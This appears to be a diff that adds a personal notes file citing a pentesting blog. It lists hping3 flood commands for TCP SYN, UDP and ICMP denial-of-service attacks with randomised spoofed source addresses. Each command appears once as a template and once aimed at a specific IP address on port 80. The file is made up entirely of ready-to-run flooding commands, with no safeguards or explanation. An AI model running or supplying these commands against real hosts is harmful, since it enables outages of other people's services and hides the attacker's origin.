@@ -1,0 +1,15 @@
+https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/
+
+tcp syn flood :
+hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
+hping3 -c 20000 -d 120 -S -w 64 -p 80 --flood --rand-source 128.199.182.131
+
+
+UDP Flood:
+hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
+hping3 --flood --rand-source --udp -p 80 128.199.182.131
+
+ICMP FLOOD:
+hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP
+hping3 --flood --rand-source -1 -p 80 128.199.182.131
+
